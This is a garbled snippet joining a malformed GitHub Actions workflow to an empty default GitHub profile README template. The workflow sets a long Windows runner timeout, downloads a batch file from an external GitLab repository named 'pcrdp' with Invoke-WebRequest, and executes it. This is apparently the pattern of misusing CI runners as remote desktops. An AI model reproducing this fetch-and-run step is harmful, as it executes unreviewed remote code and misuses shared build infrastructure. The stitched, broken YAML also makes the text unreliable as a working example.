name

on:

workflow_dispatch:

jobs:

build:

name:

Start Building...

runs-on: windows-latest

timeout-minutes: 360

steps:

- name: Downloading & Installing Essentials

run:

|

Invoke-WebRequest -Uri

"https://gitlab.com/raposabrty/pcrdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"

cmd /c Downloads.bat

name: Show Website

run:

cmd /c show.bat

👋 Hi, I’m @Balajihemke
- 👀 I’m interested in ...
- 🌱 I’m currently learning ...
- 💞️ I’m looking to collaborate on ...
- 📫 How to reach me ...
- 😄 Pronouns: ...
- ⚡ Fun fact: ...

<!---
Balajihemke/Balajihemke is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
